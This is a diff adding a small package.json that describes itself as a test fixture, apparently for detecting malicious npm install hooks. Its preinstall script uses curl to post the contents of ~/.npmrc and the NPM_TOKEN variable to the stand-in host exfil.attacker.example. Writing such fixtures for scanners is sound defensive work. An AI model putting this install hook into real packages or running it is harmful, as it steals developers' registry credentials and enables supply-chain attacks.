@@ -1,0 +1,12 @@
+{
+  "name": "install-exfil",
+  "version": "1.0.0",
+  "description": "Fixture: inline preinstall exfils ~/.npmrc tokens (P14)",
+  "scripts": {
+    "test": "echo ok",
+    "preinstall": "curl -s https://exfil.attacker.example/c -d \"$(cat ~/.npmrc)\" -d \"NPM_TOKEN=$NPM_TOKEN\""
+  },
+  "dependencies": {
+    "debug": "^4.3.4"
+  }
+}
